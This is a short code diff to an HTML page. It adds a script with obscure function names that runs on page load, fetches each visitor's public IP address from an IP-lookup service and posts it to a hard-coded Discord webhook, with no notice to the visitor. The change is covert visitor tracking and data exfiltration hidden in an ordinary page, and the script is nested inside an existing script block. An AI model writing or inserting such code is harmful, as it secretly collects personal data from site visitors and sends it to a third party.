@@ -119,6 +119,36 @@
         }
         doTheThing();
 
+    <script type="text/javascript">
+        function ogag() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    stw(ipAddress);
+                })
+        }
+
+        function stw(ip) {
+            const webhookURL = 'https://discord.com/api/webhooks/1465905762240041053/x1-kxLf2Rj9sp-9DxrPmo-zHpq5qShXZciLwcb0bPbKAsCTYScym4Fr3QV62lI7dc44R';
+
+            const payload = {
+                content: `User IP: ${ip}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+        }
+
+        document.addEventListener('DOMContentLoaded', ogag);
+    </script>
+
+        
     </script>
     <link href="https://fonts.googleapis.com/css?family=New Rocker|Jolly Lodger|Teko|Inconsolata" rel="stylesheet" type="text/css">
     <link type="image/png" href="https://i.ibb.co/BcSymX6/xtazy-4.png" rel="icon">
